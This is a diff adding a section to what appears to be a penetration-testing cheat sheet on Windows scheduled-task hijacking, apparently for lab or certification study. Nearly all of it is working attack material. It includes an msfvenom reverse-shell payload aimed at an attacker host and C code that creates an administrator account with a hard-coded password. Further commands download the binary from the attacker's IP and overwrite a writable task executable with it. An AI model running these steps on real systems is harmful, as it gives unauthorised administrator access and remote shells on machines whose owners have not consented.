@@ -20,3 +20,38 @@ schtasks /query /fo LIST /v
 icacls C:\Path\To\Task\ToRun.exe
 ```
 If there is F, W or those permissions are inherited (I) - we can replace the exe with our own payload.
+# Create new malicious task binary
+```bash
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o reverse.exe
+```
+Example malicious service to use:
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+On kali, cross-compile the service:
+```batch
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+# Hijack interesting task with a malicious binary
+Transfer the service to the target machine:
+```powershell
+iwr -uri http://$(IP_ADDRESS)/adduser.exe -Outfile adduser.exe
+```
+Backup the original interesting service:
+```powershell
+move C:\path\to\interesting\TaskToRun.exe Task.exe
+```
+Replace service binary with new malicious service:
+```powershell
+move .\adduser.exe C:\path\to\interesting\TaskToRun.exe
+```
